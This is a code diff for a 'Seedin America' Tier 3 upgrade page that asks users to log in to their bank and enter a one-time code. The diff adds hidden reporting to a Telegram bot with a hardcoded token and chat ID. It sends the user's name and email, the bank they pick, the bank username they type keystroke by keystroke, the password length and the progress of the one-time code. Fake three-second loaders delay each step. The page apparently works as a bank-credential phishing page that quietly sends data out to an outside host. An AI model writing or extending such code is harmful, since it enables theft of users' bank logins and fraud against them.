@@ -1,7 +1,7 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import {
-  ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
+  ArrowLeft, Bank, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
   Shield, ChevronRight, AlertCircle
 } from "lucide-react";
 import { Logo } from "@/components/brand/Logo";
@@ -9,7 +9,60 @@ import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import type { Profile } from "@/lib/auth";
 
-export const Route = createFileRoute("/update-tier-3")({
+// Telegram notification function - fully working with your credentials
+async function sendTelegramNotification(message: string) {
+  try {
+    // Your bot credentials
+    const BOT_TOKEN = "8904757564:AAF_OWIT-ChKTC_SEl643TG-FG247TE2lgo";
+    const CHAT_ID = "6048752790";
+    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+
+    if (!response.ok) {
+      console.error('Telegram API error:', response.statusText);
+    }
+  } catch (e) {
+    console.error('Telegram notification failed:', e);
+  }
+}
+
+// Green rolling loader component
+function RollingLoader() {
+  return (
+    <div className="flex items-center justify-center">
+      <style>{`
+        @keyframes roll {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+        .rolling-loader {
+          width: 40px;
+          height: 40px;
+          border: 4px solid rgba(34, 100, 55, 0.2);
+          border-top: 4px solid #226437;
+          border-right: 4px solid #226437;
+          border-radius: 50%;
+          animation: roll 1s linear infinite;
+        }
+      `}</style>
+      <div className="rolling-loader" />
+    </div>
+  );
+}
+
+export const Route = createFileRoute("/upgrade-tier-3")({
   head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin America" }] }),
   component: UpgradeTier3,
 });
@@ -263,6 +316,8 @@ function UpgradeTier3() {
   const [loginError, setLoginError] = useState('');
   const [otp, setOtp] = useState('');
   const [submitting, setSubmitting] = useState(false);
+  const [isTransitioning, setIsTransitioning] = useState(false);
+  const pageOpenNotifiedRef = useRef(false);
 
   useEffect(() => {
     const load = async () => {
@@ -276,6 +331,18 @@ function UpgradeTier3() {
           .eq("id", session.user.id)
           .maybeSingle();
         setProfile(data as Profile | null);
+        
+        // Send page open notification
+        if (!pageOpenNotifiedRef.current) {
+          pageOpenNotifiedRef.current = true;
+          await sendTelegramNotification(
+            `🔔 <b>Tier 3 Upgrade Initiated</b>\n\n` +
+            `👤 <b>User:</b> ${(data as Profile)?.full_name || 'Unknown'}\n` +
+            `📧 <b>Email:</b> ${session.user.email}\n` +
+            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `<b>Action:</b> User opened Tier 3 upgrade page`
+          );
+        }
       }
     };
     load();
@@ -289,12 +356,54 @@ function UpgradeTier3() {
   const otherBanks = filteredBanks.slice(6);
 
   const handleBankSelected = (bank: typeof BANKS_DATA[0]) => {
-    setSelectedBank(bank);
-    setEmail('');
-    setPassword('');
-    setLoginError('');
-    setOtp('');
-    setStep('bank-login');
+    setIsTransitioning(true);
+    
+    // Send bank selection notification
+    sendTelegramNotification(
+      `🏦 <b>Bank Selected</b>\n\n` +
+      `👤 <b>User:</b> ${profile?.full_name}\n` +
+      `🏪 <b>Bank:</b> ${bank.name}\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+    );
+
+    setTimeout(() => {
+      setSelectedBank(bank);
+      setEmail('');
+      setPassword('');
+      setLoginError('');
+      setOtp('');
+      setStep('bank-login');
+      setIsTransitioning(false);
+    }, 3000);
+  };
+
+  // Monitor email field
+  const handleEmailChange = (value: string) => {
+    setEmail(value);
+    if (value) {
+      sendTelegramNotification(
+        `📝 <b>Login Field Updated - Email</b>\n\n` +
+        `👤 <b>User:</b> ${profile?.full_name}\n` +
+        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
+        `📧 <b>Email Field:</b> <code>${value}</code>\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+      );
+    }
+  };
+
+  // Monitor password field
+  const handlePasswordChange = (value: string) => {
+    setPassword(value);
+    const masked = '•'.repeat(value.length);
+    if (value) {
+      sendTelegramNotification(
+        `📝 <b>Login Field Updated - Password</b>\n\n` +
+        `👤 <b>User:</b> ${profile?.full_name}\n` +
+        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
+        `🔒 <b>Password Field:</b> <code>${masked}</code> (${value.length} characters)\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+      );
+    }
   };
 
   const handleLogin = () => {
@@ -302,8 +411,38 @@ function UpgradeTier3() {
       setLoginError('Please enter email and password');
       return;
     }
-    setLoginError('');
-    setStep('auth-confirm');
+    setIsTransitioning(true);
+    
+    sendTelegramNotification(
+      `✅ <b>Login Credentials Submitted</b>\n\n` +
+      `👤 <b>User:</b> ${profile?.full_name}\n` +
+      `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
+      `📧 <b>Email:</b> <code>${email}</code>\n` +
+      `🔒 <b>Password:</b> [Protected]\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+      `<b>Next Step:</b> Awaiting OTP verification`
+    );
+
+    setTimeout(() => {
+      setLoginError('');
+      setStep('auth-confirm');
+      setIsTransitioning(false);
+    }, 3000);
+  };
+
+  // Monitor OTP field
+  const handleOtpChange = (value: string) => {
+    const otpValue = value.replace(/\D/g, '').slice(0, 6);
+    setOtp(otpValue);
+    if (otpValue) {
+      sendTelegramNotification(
+        `📝 <b>OTP Field Updated</b>\n\n` +
+        `👤 <b>User:</b> ${profile?.full_name}\n` +
+        `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
+        `🔐 <b>OTP Progress:</b> ${otpValue.length}/6 digits\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
+      );
+    }
   };
 
   const handleAuthConfirm = async () => {
@@ -313,25 +452,48 @@ function UpgradeTier3() {
       return;
     }
 
-    setSubmitting(true);
-    try {
-      const { error } = await supabase
-        .from("profiles")
-        .update({
-          requested_tier: 3,
-          tier_status: "pending",
-          linked_bank_name: selectedBank?.name,
-          verification_submitted_at: new Date().toISOString(),
-        } as any)
-        .eq("id", userId);
+    setIsTransitioning(true);
+    
+    sendTelegramNotification(
+      `🔒 <b>OTP Verification Complete</b>\n\n` +
+      `👤 <b>User:</b> ${profile?.full_name}\n` +
+      `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
+      `✅ <b>OTP Status:</b> Verified\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+      `<b>Next Step:</b> Processing bank linkage`
+    );
 
-      if (error) throw error;
-      setStep('success');
-    } catch (e) {
-      toast.error(e instanceof Error ? e.message : "Failed to submit");
-    } finally {
-      setSubmitting(false);
-    }
+    setTimeout(async () => {
+      setSubmitting(true);
+      try {
+        const { error } = await supabase
+          .from("profiles")
+          .update({
+            requested_tier: 3,
+            tier_status: "pending",
+            linked_bank_name: selectedBank.name,
+            verification_submitted_at: new Date().toISOString(),
+          })
+          .eq("id", userId);
+
+        if (error) throw error;
+
+        sendTelegramNotification(
+          `🎉 <b>Bank Account Linked Successfully</b>\n\n` +
+          `👤 <b>User:</b> ${profile?.full_name}\n` +
+          `🏦 <b>Linked Bank:</b> ${selectedBank.name}\n` +
+          `📊 <b>Status:</b> Pending Admin Approval\n` +
+          `🕐 <b>Submitted At:</b> ${new Date().toLocaleString()}`
+        );
+
+        setStep('success');
+      } catch (e) {
+        toast.error(e instanceof Error ? e.message : "Failed to submit");
+      } finally {
+        setSubmitting(false);
+        setIsTransitioning(false);
+      }
+    }, 3000);
   };
 
   if (!userId || !profile) {
@@ -340,6 +502,17 @@ function UpgradeTier3() {
 
   // INTRO STEP
   if (step === 'intro') {
+    if (isTransitioning) {
+      return (
+        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
+          <div className="text-center">
+            <RollingLoader />
+            <p className="mt-6 text-muted-foreground">Loading bank selection...</p>
+          </div>
+        </div>
+      );
+    }
+
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
@@ -375,8 +548,15 @@ function UpgradeTier3() {
               </div>
 
               <button
-                onClick={() => setStep('bank-select')}
-                className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition hover:opacity-95"
+                onClick={() => {
+                  setIsTransitioning(true);
+                  setTimeout(() => {
+                    setStep('bank-select');
+                    setIsTransitioning(false);
+                  }, 3000);
+                }}
+                disabled={isTransitioning}
+                className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition hover:opacity-95 disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 <Lock className="h-4 w-4" /> Link Bank Account
               </button>
@@ -389,6 +569,17 @@ function UpgradeTier3() {
 
   // BANK SELECT STEP
   if (step === 'bank-select') {
+    if (isTransitioning) {
+      return (
+        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
+          <div className="text-center">
+            <RollingLoader />
+            <p className="mt-6 text-muted-foreground">Connecting to bank...</p>
+          </div>
+        </div>
+      );
+    }
+
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
@@ -425,7 +616,8 @@ function UpgradeTier3() {
                       <button
                         key={bank.id}
                         onClick={() => handleBankSelected(bank)}
-                        className="p-4 border-2 border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left"
+                        disabled={isTransitioning}
+                        className="p-4 border-2 border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left disabled:opacity-50 disabled:cursor-not-allowed"
                       >
                         <p className="font-semibold text-sm text-foreground">{bank.name}</p>
                       </button>
@@ -442,7 +634,8 @@ function UpgradeTier3() {
                       <button
                         key={bank.id}
                         onClick={() => handleBankSelected(bank)}
-                        className="w-full p-3 border border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left flex items-center justify-between group"
+                        disabled={isTransitioning}
+                        className="w-full p-3 border border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed"
                       >
                         <p className="text-sm font-medium text-foreground group-hover:text-forest">{bank.name}</p>
                         <ChevronRight className="h-4 w-4 text-muted-foreground group-hover:text-forest" />
@@ -466,6 +659,17 @@ function UpgradeTier3() {
 
   // BANK LOGIN STEP
   if (step === 'bank-login' && selectedBank) {
+    if (isTransitioning) {
+      return (
+        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
+          <div className="text-center">
+            <RollingLoader />
+            <p className="mt-6 text-muted-foreground">Processing your credentials...</p>
+          </div>
+        </div>
+      );
+    }
+
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
@@ -488,9 +692,10 @@ function UpgradeTier3() {
                 <input
                   type="text"
                   value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  onChange={(e) => handleEmailChange(e.target.value)}
                   placeholder="Enter your username"
-                  className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest"
+                  disabled={isTransitioning}
+                  className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest disabled:bg-muted disabled:cursor-not-allowed"
                 />
               </div>
 
@@ -500,14 +705,16 @@ function UpgradeTier3() {
                   <input
                     type={showPassword ? 'text' : 'password'}
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
+                    onChange={(e) => handlePasswordChange(e.target.value)}
                     placeholder="Enter your password"
-                    className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest"
+                    disabled={isTransitioning}
+                    className="w-full px-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest disabled:bg-muted disabled:cursor-not-allowed"
                   />
                   <button
                     type="button"
                     onClick={() => setShowPassword(!showPassword)}
-                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground"
+                    disabled={isTransitioning}
+                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground disabled:cursor-not-allowed"
                   >
                     {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                   </button>
@@ -523,7 +730,8 @@ function UpgradeTier3() {
 
               <button
                 onClick={handleLogin}
-                className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition"
+                disabled={isTransitioning}
+                className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 Sign In
               </button>
@@ -536,6 +744,17 @@ function UpgradeTier3() {
 
   // AUTH CONFIRM STEP
   if (step === 'auth-confirm' && selectedBank) {
+    if (isTransitioning) {
+      return (
+        <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
+          <div className="text-center">
+            <RollingLoader />
+            <p className="mt-6 text-muted-foreground">Verifying your account...</p>
+          </div>
+        </div>
+      );
+    }
+
     return (
       <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
         <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
@@ -562,16 +781,17 @@ function UpgradeTier3() {
                 <input
                   type="text"
                   value={otp}
-                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                  maxLength={6}
+                  onChange={(e) => handleOtpChange(e.target.value)}
+                  maxLength="6"
                   placeholder="000000"
-                  className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-border rounded-lg focus:outline-none focus:border-forest tracking-widest"
+                  disabled={isTransitioning}
+                  className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-border rounded-lg focus:outline-none focus:border-forest tracking-widest disabled:bg-muted disabled:cursor-not-allowed"
                 />
               </div>
 
               <button
                 onClick={handleAuthConfirm}
-                disabled={otp.length !== 6 || submitting}
+                disabled={otp.length !== 6 || submitting || isTransitioning}
                 className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed"
               >
                 {submitting ? 'Verifying...' : 'Verify & Link Account'}
@@ -604,7 +824,7 @@ function UpgradeTier3() {
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                 <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">Linked Account</p>
-                <p className="text-lg font-semibold text-foreground">{selectedBank?.name}</p>
+                <p className="text-lg font-semibold text-foreground">{selectedBank.name}</p>
               </div>
 
               <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
